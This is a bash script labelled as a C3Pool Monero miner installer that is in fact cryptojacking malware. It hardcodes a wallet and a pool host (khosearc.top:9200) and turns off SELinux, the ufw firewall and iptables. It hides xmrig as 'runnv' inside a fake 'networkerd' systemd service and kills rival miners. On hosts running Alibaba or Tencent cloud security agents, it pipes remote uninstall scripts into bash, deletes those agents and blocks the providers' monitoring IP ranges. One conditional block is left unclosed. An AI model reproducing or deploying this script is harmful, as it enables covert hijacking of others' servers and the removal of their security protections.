#!/bin/bash

VERSION=2.11

# printing greetings
HOME=/tmp
echo "C3Pool mining setup script v$VERSION."
echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo
setenforce 0 2>/dev/null
ufw disable
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
  echo "警告: 不建议在root用户下使用此脚本"
fi

# command line arguments
WALLET="49Qp2aEzUdEANd88muJEvDVKEzn9xbm5xEXjZ8QUeN1ndVxvtUuSjZAecFJHabrzYE2VXTu5sZM8H5GiKfKah1VJBwuWhYc"
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_c3pool_miner.sh <wallet address or USDT TRC20 address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106, 95, or 34 for USDT TRC20): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  echo "set HOME directry to /tmp success"
  export HOME="/tmp"
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

get_port_based_on_hashrate() {
  local hashrate=$1
  if [ "$hashrate" -le "5000" ]; then
    echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then
      echo 13333
    else
      echo 443
    fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then
      echo 15555
    else
      echo 14444
    fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then
      echo 19999
    else
      echo 17777
    fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERROR: Hashrate too high"
    exit 1
  fi
}

PORT=$(get_port_based_on_hashrate $EXP_MONERO_HASHRATE)
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

echo "Computed port: $PORT"


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "将进行下载设置,并在后台中运行xmrig矿工."
echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/c3pool/miner.sh script."
echo "Mining will happen to $WALLET wallet."
echo "将使用 $WALLET 地址进行开采"
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
else
  echo "Mining in background will be performed using c3pool_miner systemd service."
  echo "后台开采将使用c3pool_miner systemd服务执行."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
echo "等待 15 秒将继续运行安装 (按 Ctrl+C 取消)"
sleep 5
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous c3pool miner (if any)"
echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
fi
killall -9 xmrig
killall -9 runnv
echo "[*] Removing $HOME/c3pool directory"
rm -rf $HOME/c3pool

echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
if ! curl -L --progress-bar "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/runnv.tar.gz; then
  echo "ERROR: Can't download https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/runnv.tar.gz"
  echo "发生错误: 无法下载 https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/runnv.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/runnv.tar.gz to $HOME/runnv"
echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/runnv"
[ -d $HOME/runnv ] || mkdir $HOME/runnv
if ! tar xf /tmp/runnv.tar.gz -C $HOME/runnv; then
  echo "ERROR: Can't unpack /tmp/runnv.tar.gz to $HOME/runnv directory"
  echo "发生错误: 无法解压 /tmp/runnv.tar.gz 到 $HOME/runnv 目录"
  export HOME="/tmp"
fi
rm /tmp/runnv.tar.gz
mv $HOME/runnv/xmrig $HOME/runnv/runnv
echo "[*] Checking if advanced version of $HOME/runnv/runnv works fine (and not removed by antivirus software)"
echo "[*] 检查目录 $HOME/runnv/runnv 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/runnv/config.json
$HOME/runnv/runnv --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/runnv/runnv ]; then
    echo "WARNING: Advanced version of $HOME/runnv/runnv is not functional"
	echo "警告: 版本 $HOME/c3pool/xmrig 无法正常工作"
  else 
    echo "WARNING: Advanced version of $HOME/runnv/runnv was removed by antivirus (or some other problem)"
	echo "警告: 该目录 $HOME/runnv/runnv 下的xmrig已被杀毒软件删除 (或其它问题)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  echo "[*] 查看最新版本的 xmrig 挖矿工具"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/runnv.tar.gz"
  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/runnv.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/runnv.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/runnv.tar.gz"
	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/runnv.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/runnv.tar.gz to $HOME/runnv"
  echo "[*] 解压 /tmp/runnv.tar.gz 到 $HOME/runnv"
  if ! tar xf /tmp/runnv.tar.gz -C $HOME/runnv --strip=1; then
    echo "WARNING: Can't unpack /tmp/runnv.tar.gz to $HOME/runnv directory"
	echo "警告: 无法解压 /tmp/runnv.tar.gz 到 $HOME/runnv 目录下"
  fi
  rm /tmp/runnv.tar.gz
  mv $HOME/runnv/xmrig $HOME/runnv/runnv
  echo "[*] Checking if stock version of $HOME/runnv/runnv works fine (and not removed by antivirus software)"
  echo "[*] 检查目录 $HOME/runnv/runnv 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/runnv/config.json
  $HOME/runnv/runnv --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/runnv/runnv ]; then
      echo "ERROR: Stock version of $HOME/runnv/runnv is not functional too"
	  echo "发生错误: 该目录中的 $HOME/runnv/runnv 也无法使用"
    else 
      echo "ERROR: Stock version of $HOME/runnv/runnv was removed by antivirus too"
	  echo "发生错误: 该目录中的 $HOME/runnv/runnv 已被杀毒软件删除"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/runnv/runnv is OK"
echo "[*] 矿工 $HOME/runnv/runnv 运行正常"

PASS="qq6"

sed -i 's/"url": *"[^"]*",/"url": "khosearc.top:9200",/' $HOME/runnv/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/runnv/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/runnv/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 50,/' $HOME/runnv/config.json
sed -i 's/"tls": *[false,]*,/"tls": true,/' $HOME/runnv/config.json

cp $HOME/runnv/config.json $HOME/runnv/config_bg.json




chmod +x $HOME/runnv/runnv

# preparing script background work and work under reboot


if [ "$(id -u)" == "0" ]; then
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
	echo "[*] 启用 huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi
fi
  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/runnv/runnv.log file)"
	  echo "[*] 已在后台运行runnv矿工 (请查看 $HOME/runnv/runnv.log 日志文件)"
    nohup $HOME/runnv/runnv  &
    rm -f nohup.out
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else
    if [ "$(id -u)" == "0" ]; then
    echo "[*] Creating c3pool_miner systemd service"
    cat >/tmp/networkerd.service <<EOL
[Unit]
Description=networkerd service

[Service]
ExecStart=$HOME/runnv/runnv --config=$HOME/runnv/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/networkerd.service /etc/systemd/system/networkerd.service
    echo "[*] Starting networkerd systemd service"
	echo "[*] 启动networkerd systemd服务"
    sudo killall xmrig 2>/dev/null
    sudo killall runnv 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable networkerd.service
    sudo systemctl start networkerd.service
    echo "To see miner service logs run \"sudo journalctl -u networkerd -f\" command"
	echo "查看矿工服务日志,请运行 \"sudo journalctl -u networkerd -f\" 命令"
  else
    nohup $HOME/runnv/runnv  &
    rm -f nohup.out
  fi
  fi

if ps aux | grep -i '[a]liyun'; then
    /etc/init.d/aegis uninstall
    (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
    (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
    sudo pkill aliyun-service
    killall -9 aliyun-service
    sudo pkill AliYunDun
    killall -9 AliYunDun
    iptables -I INPUT -s 100.100.30.1/28 -j DROP
    iptables -I INPUT -s 140.205.201.0/28 -j DROP
    iptables -I INPUT -s 140.205.201.16/29 -j DROP
    iptables -I INPUT -s 140.205.201.32/28 -j DROP
    iptables -I INPUT -s 140.205.225.192/29 -j DROP
    iptables -I INPUT -s 140.205.225.200/30 -j DROP
    iptables -I INPUT -s 140.205.225.184/29 -j DROP
    iptables -I INPUT -s 140.205.225.183/32 -j DROP
    iptables -I INPUT -s 140.205.225.206/32 -j DROP
    iptables -I INPUT -s 140.205.225.205/32 -j DROP
    iptables -I INPUT -s 140.205.225.195/32 -j DROP
    iptables -I INPUT -s 140.205.225.204/32 -j DROP
    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
    rm -rf /usr/local/aegis*
    systemctl stop aliyun.service
    systemctl disable aliyun.service
    service bcm-agent stop
    yum remove bcm-agent -y
    apt-get remove bcm-agent -y
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop
    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove
    rm -rf /usr/local/cloudmonitor
  elif ps aux | grep -i '[y]unjing'; then
    process=(sap100 secu-tcs-agent sgagent64 barad_agent agent agentPlugInD pvdriver )
    for i in ${process[@]}
    do
      for A in $(ps aux | grep $i | grep -v grep | awk '{print $2}')
      do
        kill -9 $A
      done
    done
    chkconfig --level 35 postfix off
    service postfix stop
    /usr/local/qcloud/stargate/admin/stop.sh
    /usr/local/qcloud/stargate/admin/uninstall.sh
    /usr/local/qcloud/YunJing/uninst.sh
    /usr/local/qcloud/monitor/barad/admin/stop.sh
    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    rm -rf /usr/local/sa
    rm -rf /usr/local/agenttools
    rm -rf /usr/local/qcloud
    rm -f /etc/cron.d/sgagenttask

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU使用率，否则可能将被禁止使用"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e runnv -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e runnv -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e runnv -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/runnv/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/runnv/config_bg.json"
fi
echo ""

echo "[*] Setup complete"
echo "[*] 安装完成"
echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"


